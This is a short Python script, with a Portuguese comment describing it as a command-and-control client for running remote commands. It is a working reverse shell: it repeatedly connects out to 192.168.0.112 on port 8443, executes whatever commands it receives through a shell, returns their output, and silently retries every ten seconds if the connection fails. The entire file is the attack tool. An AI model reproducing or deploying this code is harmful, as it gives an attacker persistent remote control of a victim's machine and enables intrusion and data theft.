#Criaremos um cliente tipo C&C em que aceita conexões remotas de um servidor para que eu possa executar comandos remotos.

import socket
import subprocess
import time

while True:
    
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(("192.168.0.112", 8443))
        
        while True:
            cmd = client.recv(2048).decode()
            
            if cmd == "exit":
                client.close()
                break
            
            saida, erro = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()
            client.sendall(saida + erro)
    except:
        time.sleep(10)